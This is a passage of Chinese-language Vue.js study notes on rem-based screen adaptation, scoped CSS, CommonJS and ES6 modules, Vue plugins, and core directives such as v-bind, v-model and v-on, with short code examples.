```
	npm install packagename --dev 
```

## 不同屏幕适配

### rem布局

> 原理

由于px是不可变的，所以我们适配不同分辨率的屏幕时不能使用px，我们可以使用rem或者vw这些可变化的单位来进行适配，比如我们在一个宽度分辨率为2000px的屏幕，假设我们的设计稿也是2000px的，如果我们在2000px的屏幕显示刚好是显示100%,没有任何问题，但是如果在宽度分辨率为1000px的屏幕就不能100%显示，而是只能显示1000px，设计稿也就是一半，这体验是非常不友好的，我们应该也要把我们的网页也对应缩小一半，也就是按比例来缩小（类似vw布局），所以我们应该统一使用rem为单位来开发，但我们屏幕比设计稿小一半时，我们只需要把rem缩小一半就行，这个步骤我们可以使用js来实现，当然，我们如果使用了vue来进行开发，我们可以使用插件来更简单的实现rem布局

js实现的基本代码，当然，我们使用时使用rem单位，可以通过less来进行简单计算，因为没有使用插件来进行但未进行转换，需要我们手动转换

```
// rem等比适配配置文件
// 基准大小
const baseSize = 50
// 设置 rem 函数
function setRem () {
  // 当前页面宽度相对于 1920宽的缩放比例，可根据自己需要修改。
  const scale = document.documentElement.clientWidth / 1920
//Math.min(pramA,pramB...) 返回零个或更多个数值的最小值。
  // 设置页面根节点字体大小（“Math.min(scale, 2)” 指最高放大比例为2，可根据实际业务需求调整）
  document.documentElement.style.fontSize = baseSize * Math.min(scale, 2) + 'px'
}
// 初始化
setRem()
// 改变窗口大小时重新设置 rem
window.onresize = function () {
  setRem()
}
```

实现步骤：

1. 安装amfe-flexible插件

   ```
   npm i amfe-flexible
   ```

2. 在main.js引入amfe-flexible插件

   ```
   import 'amfe-flexible'
   ```

3. 安装postcss-px2rem插件

   ```
   npm i postcss-px2rem
   ```

4. 在package.json中配置

   ```
    "postcss": {
       "plugins": {
         "autoprefixer": {},
         "postcss-px2rem": {
           "remUnit": 108   //设计稿的10/1，108也就是指设计稿为1080px
         }
       }
     }
   ```

如果个别地方不想转化px。可以简单的使用大写的 **PX** 或 **Px** 。

**进阶适配：**

​	上面的适配可以解决绝大部分的屏幕适配问题，但是如果当屏幕比发生变化时，上面的适配是根据屏幕宽度来进行适配的，比如在浏览器不全屏显示的时候，高度是可以占满的，但是全屏后，由于屏幕宽度没有发生变化，所以rem也不会变化，全屏后就产生了高度不占满屏幕的情况

解决上面问题可以采用rem布局（根据高度来进行适配），屏幕宽度使用flex布局或者百分比，或者ant-design的栅格布局等等

实现步骤：

1. 安装postcss-pxtorem插件

   ```
   npm i postcss-pxtorem
   ```

2. 在vue.config.js中引入并配置该插件

   ```
   css: {
       loaderOptions: {
         postcss: {
           plugins: [
             require('postcss-pxtorem')({//这里是配置项，详见官方文档
               rootValue: 20, // 设计稿下的rem大小，单位为px
               propList: ['*'],
             }),
           ]
         }
       }
     },
   ```

3. 创建rem.js，用来按比例放大或缩小网页，如果是设计稿的高度的比例就为1

   ```
   // rem等比适配配置文件
   // 基准大小
   const baseSize = 20
   // 设置 rem 函数
   function setRem () {
     // 当前页面宽度相对于 1920宽的缩放比例，可根据自己需要修改。
     const scale = document.documentElement.clientHeight / 1080
     //Math.min(pramA,pramB...) 返回零个或更多个数值的最小值。
     // 设置页面根节点字体大小（“Math.min(scale, 2)” 指最高放大比例为2，可根据实际业务需求调整）
     document.documentElement.style.fontSize = baseSize * Math.min(scale, 2) + 'px'
   }
   // 初始化
   setRem()
   // 改变窗口大小时重新设置 rem
   window.onresize = function () {
     setRem()
   }
   ```

4. 在main.js引入rem.js

   ```
   import './rem.js'
   ```

### vw布局



## 模块化开发

### scoped

> 在Vue文件中的style标签上有一个特殊的属性，scoped。当一个style标签拥有scoped属性时候，它的css样式只能用于当前的Vue组件，可以使组件的样式不相互污染。如果一个项目的所有style标签都加上了scoped属性，相当于实现了样式的模块化。

**原理：scoped是通过给当前组件的元素加上一个随机唯一属性，然后通过属性选择器进行唯一确认，从而不会影响到其他组件的元素**

但是有一个特别要注意的点，假设我们在一个组件使用另一个组件，我们在父组件使用

scoped也是会影响子组件的最外层div的，这是为了方便父元素布局，但是只能影响子组件的最外层div，其他无法影响

但是scoped也会带来一个问题，由于有了scoped的限制，我们引用的一些echrts和ui框架组件就不能直接影响他们的样式了，如果去掉scoped就会污染全局，

解决方案：我们可以在该选择器前面加上/deep/就行了，比如下图，这样我们的样式就只会影响.tableHome下面的元素了，而不会污染全局

![image-20201206233329101](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210405212413.png)

## 模块化概述

**传统开发模式的主要问题**

- 命名冲突
- 文件依赖

**通过模块化解决上述问题**

- 模块化就是单独的一个功能封装到一个模块（文件）中，模块之间相互隔离，但是可以通过特定的接口公开内部成员，也可以依赖别的模块
- 模块化开发的好处：方便代码的重用，从而提升开发效率，并且方便后期的维护

### **浏览器端模块化规范**

1、AMD

2、CMD

### **服务器端模块化规范**

CommonJS

1. 模块分为`单文件模块`与`包`

2. 模块成员导出：`module.exports`和`exports`

   module.exports属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取module.exports变量

   node为每一个模块提供了一个exports变量(可以说是一个对象)，指向 module.exports。这相当于每个模块中都有一句这样的命令 var exports = module.exports;

   **使用实例(文件均在同一个目录下）：**

   c.js

   ```
   const a = 10
   const b = 11
   exports.a = a
   module.exports.b = b
   ```

   d.js:

   ```
   const c = require('./c')
   console.log(c)
   ```

   输出结果：

   ![image-20201014225241275](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220432.png)

   一般采用module.exports直接导出全部变量

   当c.js变成这样：

   ```
   const a = 10
   const b = 11
   module.exports = {
     a,
     b,
   }
   ```

   输出结果：

   ![image-20201014225244872](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220437.png)

   可以实现一样的效果

   使用ES6的对象结构语法接受导入对象也是比较常见的：

   d.js：

   ```
   const { a, b } = require('./c')
   console.log(a)
   console.log(b)
   ```

   ![image-20201014225436175](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220441.png)

3. 模块化成员导入：`require('模块标识符')`

### **大一统的模块化规范-ES6模块化**

在ES6模块化规范诞生之前，Javascript社区已经尝试并提出了AMD、CMD、CommonJS等模块化规范。

但是，这些社区提出的模块化标准，还是存在一定的差异性与局限性，并不是浏览器与服务器通用的模块化标准，例如：

- AMD和CMD适用于浏览器端的Javascript模块化
- CommonJS适用于服务器端的Javascript模块化

因此，ES6语法规范中，在语言层面上定义了ES6模块化规范，是浏览器端与服务器端通用的模块化开发规范。

ES6模块化规范中定义：

- 每个js文件都是一个独立的模块
- `导入模块成员`使用`import`关键字
- `暴露模块成员`使用`export和export default关键字

> export和export default的区别

 **1.export与export default均可用于导出常量、函数、文件、模块等**
	   **2.在一个文件或模块中，export、import可以有多个，export default只可以有一个**
	   **3.通过export方式导出，在导入时要加{ }，而且名称要一一对应（可以用as来起别名），export default则不需要，名称也没有限制**	

**ES6模块化规范在服务器端的使用*（nodejs)*****

通过babel实现，nodejs环境默认不支持ES6模块化规范

`babel是将高级、有兼容性的js，转换为低级、无兼容性的js的**语法转换工具**`

1. npm install --save-dev @babel/core @babel/cli @babel/preset-env @babel/node

2. npm install --save @babel/polyfill

3. 在项目根目录创建文件babel.config.js

4. babel.config.js文件内容如下代码：

   ```
   const presets = [
   	[
   		"@babel/env",{
   			targets:{
   				edge:"17",
   				firefox:"60",
   				chrome:"67",
   				safari:"11.1"
   			}
   		}
   	]
   ]
   module.exports = {
   	presets
   }
   ```

5. 通过npx babel-node index.js 执行代码

***注释：babel运行之前，先读取babel.config.js配置文件，根据配置信息，进行代码转换***

**使用实例(文件均在同一个目录下）：**

m1.js:

```
	let a = 10
     function show() {
       console.log('11111')
     }
     export default {
       a,
       show,
     }
     export let s1 = 'aaa'
     export function say() {
       console.log('asasas')
     }
```

index.js:

```
     import m1, { s1, say } from './m1.js'
     console.log(m1)
     console.log(s1)
     say()
```

输出结果：

![image-20201014231044003](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220444.png)

**ES6模块化规范在浏览器端的使用**

**使用实例(文件均在同一个目录下）：**

a.js:

```
     var name = '小明'
     var age = 18
     var address = '广州'
     // 导出方式一
     export { name, age }
     //导出方式二：
     export var num1 = 1000
     export function mul(numl) {
       return num1
     }
     //导出方式三:
     export default address
```

b.js:

```
	//第一种导入方式
	import address, { name as alias, age, num1, mul } from './a.js'
     console.log(alias)
     console.log(age)
     console.log(num1)
     console.log(mul)
     console.log(address)
     //第二种导入方式：
     import address, * as aaa from './a.js'
	console.log(aaa.name + aaa.age + aaa.num1)
```

index.html:

```
     <!DOCTYPE html>
     <html lang="en">
       <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Document</title>
       </head>
       <body>
         <!-- <script src="./a.js" type="module"></script> -->
         <script src="./b.js" type="module"></script>
       </body>
     </html>
```

注：要使用export和import，在引入js文件的时候必须加上属性type='module',不需要全部文件都在html引入，只需要引入b.js，因为a.js已经在b.js引入了，a.js有作用的部分已经放到b.js中了，如果还在html引入就没有意义了

### 插件

在Vue项目中，我们使用Element-ui,或者ant-design这些都需要使用Vue.use安装使用它，这是为什么？

比如：![image-20201031172437682](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220447.png)

因为这样相当于全局注册了该组件，就可以在任何组件中使用了。（注意：某些组件不能通过Vue.use注册，比如axios,是因为它没有install方法

我们首先自己自定义一个全局组件吧

在index.js中：

![image-20201031172809099](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220450.png)

Vue.components中的Filters是真正使用的插件名，比如<Filters/>,而不是<table/>

在main.js中注册(实际上就运行了下index.js中的table函数)

![image-20201031173145811](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220454.png)

这样我们就可以在任何地方使用了

例如在user.vue中；
	![image-20201031173244669](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220457.png)

实际上注册全局组件并不需要那么复杂，只需要两行代码就行，上面的方法只是更好的封装以及功能更强大

![image-20201031173930801](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220500.png)

只需要

```
     import index from './components/index.vue'
     // Vue.use(index)
     Vue.component('Filters', index)
```

要注意，记得加上.vue后缀，不能省略，因为在.js文件中，如果没有加后缀名，会优先加载.js

两行代码就能搞定的事为什么要搞那么复杂呢？

实际上Vue.use也是基于这两行代码

Vue.use()中的参数是一个对象，然后会执行参数对象中的install方法，所以使用Vue.use也是相当于执行了Vue.component('Filters', index)，没有区别，只不过

Vue.use()还可以注册全局方法等有用的东西

```
    let MyPlugin={}
    MyPlugin.install = function (Vue, options) {
       // 1. 添加全局方法或 property
       Vue.myGlobalMethod = function () {
         // 逻辑...
       }
       // 2. 添加全局资源
       Vue.directive('my-directive', {
         bind (el, binding, vnode, oldVnode) {
           // 逻辑...
         }
         ...
       })
       // 3. 注入组件选项
       Vue.mixin({
         created: function () {
           // 逻辑...
         }
         ...
       })
       // 4. 添加实例方法
       Vue.prototype.$myMethod = function (methodOptions) {
         // 逻辑...
       }
     }
     export default Myplugin
```

### scoped属性

> Add "scoped" attribute to limit CSS to this component only

**使用：**

​	使用在style标签上	

例如：

![image-20201029134008532](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220503.png)

**作用：实现组件样式的私有化不对全局造成样式污染**

例如：

子组件：

```
     <template>
         <p class="son">son</p>
     </template>
     <script>
     export default {
       name: 'HelloWorld',
       props: {
         msg: String
       }
     }
     </script>
     <style scoped>
       .parent{
         color: red;
       }
     </style>
```

父组件：

```
     <template>
       <div id="app">
        <hello-world/>
        <p class="parent">parent</p>
       </div>
     </template>
     <script>
     import HelloWorld from './components/HelloWorld.vue'
     export default {
       name: 'App',
       components: {
         HelloWorld
       }
     }
     </script>
      <style>
       .son{
         color: blue;
       }
     </style>
```

输出结果：

![image-20201029134540897](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220506.png)

由于子组件中的style标签加了scoped属性，所以它的样式只对自身组件有效，并不能影响其他组件

父组件中的style标签没有scoped属性，所以它的样式可以控制全局样式

假如把子组件中的scoped去掉也一样可以控制父元素的样式

![image-20201029134837243](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220510.png)

假设父子组件都加上scoped,父组件还是能控制子组件最外层的元素的，因为为了更好的布局，会默认在子组件第一个元素加上父元素的哈希值

![image-20210308033516460](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210308033517.png)

## 				vue基本语法

### Mustachae语法

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220515.png" alt="image-20210222130408908" style="zoom:80%;" />

### v-once

>  该指令后面不需要跟任何表达式
>
>  该指令表示元素和组件不会随着数据的改变而改变。 

```
 <div id="app">
        <h2>{{message}}</h2>
        <!-- v-once:
        该指令后面不需要跟任何表达式
        该指令表示元素和组件不会随着数据的改变而改变。 -->
        <h2 v-once>{{message}}</h2>
    </div>
    <script src="./js/vue.js"></script>
    <script>
        let app=new Vue({
            el:'#app',
            data:{
                message:"你好呀"
            }
        })
    </script>
```

### v-html、v-text

> 用来渲染dom innerHTML和innerText的

```
  <div id="app">
        <h2>{{url}}</h2>
        <h2 v-html="url"></h2>   //百度一下超链接
        //里面的7777会被覆盖掉，所以很少使用v-text
        <h2 v-text="url">7777</h2>   //<a href="http://www.baidu.com">百度一下</a>
    </div>
    <script src="./js/vue.js"></script>
    <script>
        let app=new Vue({
            el:"#app",
            data:{
                url:`<a href="http://www.baidu.com">百度一下</a>`
            }
        })
    </script>
```

### v-pre

> 不会处理文本内容，保留原始内容和格式

```
<div id="app">
        <h2>{{message}}</h2>    //你好
        <h2 v-pre>{{message}}</h2>  //{{message}} ，不做处理
    </div>
    <script src="./js/vue.js"></script>
    <script>
        let app=new Vue({
            el:"#app",
            data:{
                message:"你好"
            }
        })
    </script>
```

### v-cloak

> 这个用来解决闪烁问题

```
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        /* 属性选择器 */
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>
    <div id="app" v-cloak>{{message}}</div>
    <script src="./js/vue.js"></script>
    
    <script>
        //在vue解析之前，div中有一个属性v-cloak
        //在vue解析之后，div中没有一个属性v-cloak
        setTimeout(function(){
            let app=new Vue({
            el:"#app",
            data:{
                message:"你好呀"
            }
        })
        },1000)
    </script>
```



### v-bind

> v-bind  主要用于属性绑定，Vue官方提供了一个简写方式 **:bind**，例如：

```
<!-- 完整语法 -->
<a v-bind:href="url"></a>
<!-- 缩写 -->
<a :href="url"></a>
```

**绑定HTML Class**

**一、对象语法：**

我们可以给v-bind:class 一个对象，以动态地切换class。注意：v-bind:class指令可以与普通的class特性共存

HTML代码：

```
<ul class="box" v-bind:class="{‘textColor‘:isColor, ‘textSize‘:isSize}">
    <li>学习Vue</li>
    <li>学习Node</li>
    <li>学习React</li>
</ul>
```

CSS代码：

```
.box{
    border:1px dashed #f0f;
}
.textColor{
    color:#f00;
    background-color:#eef;
}
.textSize{
    font-size:30px;
    font-weight:bold;
}
```

JS代码：

```
var vm= new Vue({
    el:'.box',
    data:{
        isColor:true,
        isSize:true
    }
})
```

**也可以直接绑定数据里的一个对象：**

HTML代码：

```
<ul class="box" :class="classObject">
    <li>学习Vue</li>
    <li>学习Node</li>
    <li>学习React</li>
</ul>
```

JS代码：

```
var vm= new Vue({
    el:‘.box‘,
    data:{
        classObject:{
            ‘textColor‘:true,
            ‘textSize‘:false //不渲染，注意看下面的截图
        }
    }
})
```

<img src="http://s3.51cto.com/wyfs02/M02/89/2F/wKioL1gLE7jBVrvSAACSP3ftTFM106.png" alt="技术分享" style="zoom:67%;" />

**二、数组语法**

我们可以把一个数组传给v-bind:class，以应用一个class列表

HTML代码：

```
<ul class="box" :class="[classA, classB]">
    <li>学习Vue</li>
    <li>学习Node</li>
    <li>学习React</li>
</ul>
```

JS代码：

```
var vm= new Vue({
    el:‘.box‘,
    data:{
        classA:‘textColor‘,
        classB:‘textSize‘
    }
})
```

**如果想根据条件切换列表中的class，可以用三目运算**

HTML代码：

```
<ul class="box" :class="[isA?classA:‘‘, classB]">
    <li>学习Vue</li>
    <li>学习Node</li>
    <li>学习React</li>
</ul>
```

JS代码：

```
var vm= new Vue({
    el:‘.box‘,
    data:{
        classA:‘textColor‘,
        classB:‘textSize‘,
        isA:false 
    }
})
```

在这个例子中，首先判断isA的boolean值，如果为true，则渲染classA；如果为false，则不渲染。classB没有做三目运算，所以是始终显示的，看看页面截图

[<img src="http://s2.51cto.com/wyfs02/M01/89/2F/wKioL1gLFw7zSxVrAACvZz_XHmk974.png" alt="技术分享" style="zoom:80%;" />](http://s2.51cto.com/wyfs02/M01/89/2F/wKioL1gLFw7zSxVrAACvZz_XHmk974.png)

**对于多个class，可以这么写：**

**<component>内置组件 + v-bind: is：实现动态组件**

```
<div v-bind:class="[classA, { classB: isB, classC: isC }]">
```

**绑定内联样式**

**一、对象语法**

v-bind:style 的对象语法十分直观--非常像CSS，其实它是一个Javascript对象，**CSS属性名必须用驼峰命名法**（官方文档写的是既可以用驼峰也可以用 短横分隔命名法），但是用短横分隔是会报错的，属性值如果没有加双引号，那么会被当成变量解析

HTML代码：`（这里演示CSS属性名用短横分隔报错）,注意css属性样按照驼峰命名法的规则去写`

```
	<div id="box" :style="{color:activeColor, fontSize:size}">红嘴绿鹦哥</div>
```

JS代码：

```
var vm= new Vue({
    el:‘#box‘,
    data:{
        activeColor:‘#f00‘,
        size:‘30px‘,
        shadow:‘5px 2px 6px #000‘
    }
})
```

**二、数组语法**

可将多个样式对象应用到一个元素上

HTML代码：

```
<div class="box" :style="[styleObjectA, styleObjectB]">好好学习，天天向上</div>
```

JS代码：

```
var vm2= new Vue({
    el:‘.box‘,
    data:{
        styleObjectA:{
            fontSize:‘36px‘,
            color:‘blue‘
        },
        styleObjectB:{
            textDecoration:‘underline‘
        }
    }
})
```

**添加图片SRC地址**

给img标签的src属性赋值时，按照传统的方法{{url}}：

HTML代码：

```
<img class="box" :src="url" >
```

JS代码：

```
var vm= new Vue({
    el:‘.box‘,
    data:{
        url:‘https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png‘
    }
})
```

![image-20201121213917611](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220519.png)

>  <component> 元素是vue 里面的一个内置组件。
>
> 在<component>里面使用 v-bind: is，可以实现动态组件的效果。
>
> 也就是说is等于什么这里就渲染哪个组件，而不需要使用v-if和v-else这些方法来筛选，并且能在同一个位置实现响应式动态显示不同组件

<img src="https://img-blog.csdnimg.cn/20181025215659491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTc5NjYzMQ==,size_27,color_FFFFFF,t_70" alt="img" style="zoom: 80%;" />

<img src="https://img-blog.csdnimg.cn/20181025220423733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTc5NjYzMQ==,size_27,color_FFFFFF,t_70" alt="img" style="zoom:80%;" />

使用实例：

```
<div id="app">
     <component v-bind:is="whichcomp"></component>//组件渲染的位置
     <button v-on:click="choosencomp('a')">a</button>
     <button v-on:click="choosencomp('b')">b</button>
     <button v-on:click="choosencomp('c')">c</button>
</div>
```

```
//做一个包含列表组件
//需要给组件创建props--"todos",用于存放组件通过绑定prop --"todo"获取实例中的data数据"todolists"
var app=new Vue({
  el: '#app',
	components:{
		acomp:{
		   template:`
				<p>这里是组件A</p>
			`
			},
		bcomp:{
		   template:`
				<p>这里是组件B</p>		`
		},
		ccomp:{
			template:`
				<p>这里是组件C</p>
		`
		}},
	data:{
		whichcomp:""
	},
	methods:{
	   choosencomp:function(x){
	   this.whichcomp=x+"comp"}
   }
})
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220523.png" alt="image-20201121162128826" style="zoom:80%;" />

### v-for

> 循环

```
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .active{
            color: red;
        }
    </style>
</head>
<body>
    <div id="app">
        <ul>
            <li v-for="(item,index) in movies" @click="active(index)" :class={active:index==flag}>{{item}}</li>
        </ul>
    </div>
    <script src="./js/vue.js"></script>
    <script>
        let app=new Vue({
            el:"#app",
            data:{
                flag:-1,
          
                movies:['海王','海贼王','七龙珠','进击的巨人']
            },
            methods:{
                active:function(index){
                    this.flag=index;
                }
           }
        })
    </script>
```

组件的key属性，我们应该在使用v-for的时候使用:key = ''，但是不要使用index,可以使用item,性能会高很多

参考链接：https://cn.vuejs.org/v2/api/#key，https://blog.csdn.net/qq_41609404/article/details/84064064

​				https://www.bilibili.com/video/BV15741177Eh?p=38&spm_id_from=pageDriver

### v-model

v-model可以实现输入框和值的双向绑定，利用@input="msg=$event.target.value"监听输入并重新赋值和v-bind：value=“msg"

```
     <input v-model="sth" />
     //  等同于
     <input :value="sth" @input="sth = $event.target.value" /> //自html5开始,input每次输入都会触发oninput事件，所以输入时input的内容会绑定到sth中，于是sth的值就被改变;
     //$event 指代当前触发的事件对象;
     //$event.target 指代当前触发的事件对象的dom;
     //$event.target.value 就是当前dom的value值;
     //在@input方法中，value => sth;
     //在:value中,sth => value;
```

v-model的修饰符

1. lazy

   在默认情况下，`v-model` 在input事件中同步输入框的值与数据。

   在添加了lazy之后，会把 `oninput` 事件改成 `onchange` 事件。

   以下是核心代码

   ```
     <div id="app">
       <input type="text" v-model.lazy="msg">
       <p>{{msg}}</p>
     </div>
   </template>
   
   <script>
   export default {
     name: 'app',
     data () {
       return {
         msg: ''
       }
     }
   }
   </script>
   ```

   <img src="https://upload-images.jianshu.io/upload_images/7275569-6beeff14f77751a8.gif?imageMogr2/auto-orient/strip|imageView2/2/w/503/format/webp" alt="img" style="zoom:67%;" />

   可以看到，input框输入的内容并不会实时更新到p标签里。因为这里使用了 `lazy` 修饰符，把 `oninput` 事件改成 `onchange` 事件。

2. number

   `number` 修饰符会把 `v-model` 的值转换成数值类型。

   以下是核心代码

   ```xml
   <template>
     <div id="app">
       <input type="text" v-model.number="msg">
       <p>{{msg}} : {{typeof(msg)}}</p>
     <div/
   <template/>
   <script>
   export default {
     name: 'app',
     data () {
       return {
         msg: ''
       }
     }
   }
   </script>
   ```

   <img src="https://upload-images.jianshu.io/upload_images/7275569-f3336064f0a90a0e.gif?imageMogr2/auto-orient/strip|imageView2/2/w/503/format/webp" alt="img" style="zoom:67%;" />

   需要注意的是，如果输入的第一个字是字符串，那`number`这个修饰符就不会生效。
    输入的第一个只能是数字或者小数点或者是正负号。

   从上图可以看到，如果一开始输入的是数字，后面跟着字符串。再`number`的转换后，会把后面的字符串删掉。

   

3. trim

   `trim`的作用是过滤用户输入时首尾的空格字符。

   以下是核心代码

   ```
   <template>
     <div id="app">
       <input type="text" v-model.trim="msg">
     </div>
   </template>
   <script>
   export default {
     name: 'app',
     data () {
       return {
         msg: ''
       }
     },
     watch: {
       msg(newValue) {
         console.log(newValue);
       }
     }
   }
   </script>
   ```

   <img src="https://upload-images.jianshu.io/upload_images/7275569-7649ccb2dd63cef9.gif?imageMogr2/auto-orient/strip|imageView2/2/w/733/format/webp" alt="img" style="zoom:67%;" />

   这里用了 `watch` 来监听 `msg` ，每当 `msg` 的值有更新，就会在控制台输出更新后的值。

   从控制台可以看到，我们在值的前后输入空格，通过 `trim` 转换后得到的新值首位的空格都是被清除了。

### v-on

> `v-on`就是**用于绑定事件的**
> 例如：有个按钮，当点击的时候执行一些操作

```
<div class="app">
    <button v-on:click="myclick">click me</button>
</div>  
```

上述代码中，`v-on:`后面的值是一个方法，可以写成`myclick()`，没有参数可以写成`myclick`。
 另外这种事件对应的方法不是定义在`data`选项中，而是定义在`vue`实例的`methods`选项中，里面都是一个一个的`function`

```
var app = new Vue({
    el:'.app',
    data:{
        
    },
    methods:{
        myclick:function(){
            console.log(111111);
        }
    }
});
```

```
  <div id="app">
    <ul>
    	//这里的index变量不需要加this
      <li @click="active(index)">按钮</li>
    </ul>
  </div>
  <script src="./js/vue.js"></script>
  <script>
    let app = new Vue({
      el: "#app",
      data: {
        index: '参数'
      },
      methods: {
        active: function (index) {
          console.log(index);   //参数
        }
      }
    })
  </script>
```

`v-on`也可以绑定多个事件
多个事件可以单独多个v-on绑定

```
<div class="app">
    <button v-on:mouseenter='onenter' v-on:mouseleave='leave'>click me</button>
</div>  
```

也可以使用一个`v-on`，里头用对象的形式书写，对象的键名就是事件名，对象的键值就是对应事件要执行的方法。多个事件之间通过`,`分开

```
<div class="app">
    <button v-on="{mouseenter:onenter,mouseleave:leave}">click me</button>
</div>  
```

当然也可以混合使用

```
<div class="app">
    <button v-on="{mouseenter:onenter,mouseleave:leave}" v-on:click="myclick">click me</button>
</div>  
```

例子：在绑定form表单中的提交事件时

```jsx
<div class="app">
    <form v-on:submit='onSubmit($event)'>
        <!-- $event是vue里面的事件对象，vue能认识 -->
        <input type="text" >
        <button type="submit">提交</button>
    </form>
</div>  
```

```
var app = new Vue({
    el:'.app',
    data:{
        
    },
    methods:{
        onSubmit:function(e){
            e.preventDefault();
            //阻止浏览器的默认行为，因为在表单提交的时候，浏览器会默认发送一个get或者post请求到指定页面，刷新整个页面。
            console.log("onSubmited");
        }
    }
});
```

注意：
 `$event`是`vue`里面的事件对象，`vue`能认识
 在表单提交的时候，浏览器会默认发送一个`get`或者`post`请求到指定页面，刷新整个页面。阻止浏览器的默认行为，可以用事件对象`e.preventDefault()`

但像上述form表单提交的这种浏览器默认事件，每次都要写`e.preventDefaul()`其实还是比较麻烦。`vue`中可以更好的解决，只要在事件的后面添加一个`prevent`修饰符即可，表示阻止默认事件

```jsx
<div class="app">
    <form v-on:submit.prevent='onSubmit'>
        <input type="text" >
        <button type="submit">提交</button>
    </form>
</div>  
```

```jsx
var app = new Vue({
    el:'.app',
    data:{
        
    },
    methods:{
        onSubmit:function(){
            console.log("onSubmited");
        }
    }
});
```

绑定事件中，除了`prevent`修饰符，还有`stop`,表示停止冒泡事件

```jsx
<div class="app">
    <div v-on:click.stop='onClick'>
    </div>
</div>  
```

另外,当绑定的事件是`keyup`、`keypress`、`keydown`键盘事件时，当需要判断按下是回车时。
 在以前我们需要判断事件对象的`keyCode`，虽然功能特别简单，但是每次去写还是特别麻烦。所以对应也有修饰符，如enter修饰符，表示按键是enter键

```jsx
<div class="app">
    <div v-on:keydown.enter='mykeydownFn'>
    </div>
</div>  
```

跟`v-bind`一样，v-on也非常常用，对应也有快捷方式：
 `v-on:事件名 可以简写为 @事件名

```jsx
<div class="app">
    <div @keydown.enter='mykeydownFn'>
    </div>
</div>  
```

**v-on 修饰符**

- .stop - 调用 event.stopPropagation()，禁止事件冒泡。
- .prevent - 调用 event.preventDefault()，阻止事件默认行为。
- .capture - 添加事件侦听器时使用 capture 模式。
- .self - 只当事件是从侦听器绑定的元素本身触发时才触发回调。
- .{keyCode | keyAlias} - 只当事件是从特定键触发时才触发回调。
- `.native - 监听组件根元素的原生事件。`
- .once - 只触发一次回调。
- .left - (2.2.0) 只当点击鼠标左键时触发。
- .right - (2.2.0) 只当点击鼠标右键时触发。
- .middle - (2.2.0) 只当点击鼠标中键时触发。
- .passive - (2.3.0) 以 { passive: true } 模式添加侦听器
- .native   如果你想在某个组件的根元素上绑定事件，直接使用 @click=''function' 是不生效的，我们可以添加.native修饰符 @click.native=''function''

这些修饰符可以连着使用，比如：

```
@click.native.prevent='fun'
```

### 数据响应式要注意的点

假如data定义了一个对象，boy{name:'laji'},如果我们修改name为'niubi',那么这个是可以实现响应式的，模板会对应更新的，

但是我想增加一个属性呢，比如增加一个属性age:11（this.boy.age=18这个方式增加),这不是响应式的，模板是不会随着更新的，如果想要实现响应式，有两种方法

1. 我们定义对象的时候可以先定义age:'',这样怎么都是响应式的，但是这只能实现改，不能增加
2. 要增加或者设置的话都可以使用这个方法this.$set(this.boy,'age',18)——参数分别是对象，属性，值

### 组件的使用

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210409100354.png" alt="image-20210224172258326" style="zoom: 50%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220527.png" alt="image-20210224172905950" style="zoom: 50%;" />

#### 组件全局注册

**组件全局注册基本使用一：**

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="../js/vue.js"></script>
  <title>Document</title>
</head>
<body>
  <div id="app">
    <cpn></cpn>
    <cpn></cpn>
  </div>
  <script>
    //1.构建组件构造器对象
    const cpn = Vue.extend({
      template: `<div>  <h2>我是标题</h2> <
                p > 我是内容， 哈哈哈哈 < /p></div > `
    })
    //2.注册组件
    Vue.component('cpn', cpn)
    const app = new Vue({
      el: "#app",
      data: {
        message: "你好啊"
      }
    })
  </script>
</body>
</html>
```

效果：

![image-20210224173053313](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220531.png)

**组件全局注册基本使用二：**

```
     // 定义一个名为 button-counter 的新组件
     Vue.component('button-counter', {
       data: function () {
         return {
           count: 0
         }
       },
       template: '<button v-on:click="count++">You clicked me {{ count }} times.</butto
     })
```

**组件全局注册基本使用三：**

> 如果你恰好使用了 webpack (或在内部使用了 webpack 的 [Vue CLI 3+](https://github.com/vuejs/vue-cli))，那么就可以使用 `require.context` 只全局注册这些非常通用的基础组件。这里有一份可以让你在应用入口文件 (比如 `src/main.js`) 中全局导入基础组件的示例代码：

```
     import Vue from 'vue'
     const requireComponent = require.context(
       // 其组件目录的相对路径
       './',
       // 是否查询其子目录
       false,
       // 匹配基础组件文件名的正则表达式
       /Base[A-Z]\w+\.(vue|js)$/
     )
